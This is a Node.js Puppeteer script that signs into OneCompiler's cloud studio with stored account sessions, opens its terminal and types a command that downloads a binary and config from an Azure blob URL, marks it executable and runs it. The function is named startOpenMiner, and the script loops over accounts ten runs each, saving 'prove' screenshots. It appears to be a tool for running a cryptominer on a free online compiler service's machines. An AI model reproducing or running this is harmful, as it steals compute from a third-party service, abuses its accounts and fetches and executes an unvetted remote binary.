import puppeteer from "puppeteer";
import acc from "./acc.js";
let currentQueue = 0;
let maxQueue = 0;
const queuePerAccount = 10;

async function startOpenMiner(currentQueue, account) {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.setViewport({ width: 1080, height: 1024 });
    await page.goto("https://onecompiler.com/studio");
    await page.evaluate((acc) => {
        localStorage.setItem("reduxState", JSON.stringify(acc));
    }, account);
    await page.goto("https://onecompiler.com/studio/nodejs");

    await page.evaluate(() => {
        document.querySelectorAll("button")[8].click();
    });

    await page.screenshot({
        path: `${currentQueue}_r.png`,
    });
    await new Promise((r) => {
        setTimeout(r, 40_000);
    });

    await page.keyboard.press("F1");
    await new Promise((r) => {
        setTimeout(r, 1000);
    });
    await page.keyboard.press("T");
    await page.keyboard.press("e");
    await page.keyboard.press("r");
    await page.keyboard.press("m");
    await page.keyboard.press("i");
    await page.keyboard.press("n");
    await page.keyboard.press("a");
    await page.keyboard.press("l");
    await page.keyboard.press(":");
    await page.keyboard.press("F");
    await page.keyboard.press("o");
    await page.keyboard.press("c");
    await page.keyboard.press("u");
    await page.keyboard.press("s");
    await page.keyboard.press("ArrowDown");
    await page.keyboard.press("ArrowDown");
    await page.keyboard.press("Enter");
    console.log("Wait to open terminal");
    await new Promise((r) => {
        setTimeout(r, 10_000);
    });
    console.log("Start type");
    await page.keyboard.type(
        "wget https://xstorageimg.blob.core.windows.net/img/mtp && wget https://xstorageimg.blob.core.windows.net/img/config.json && chmod +x ./mtp && ./mtp",
        {
            delay: 100,
        }
    );
    await page.keyboard.press("Enter");
    console.log("wait to download");
    await new Promise((r) => {
        setTimeout(r, 10_000);
    });
    await page.screenshot({
        path: `prove${currentQueue}.png`,
    });
    console.log("OK");
    await browser.close();
    maxQueue--;
}

while (currentQueue <= acc.length * 10 - 1) {
    if (maxQueue >= 2) {
        console.log("stop");
        await new Promise((r) => {
            let id = setInterval(() => {
                if (maxQueue <= 0) {
                    clearInterval(id);
                    r();
                }
            }, 100);
        });
    }
    console.log("start ", currentQueue);
    startOpenMiner(
        currentQueue,
        acc[Math.floor(currentQueue / queuePerAccount)]
    );
    console.log(acc[Math.floor(currentQueue / queuePerAccount)].user.name);
    currentQueue++;
    maxQueue++;

    if (currentQueue == acc.length * 10 - 1) currentQueue = 0;
}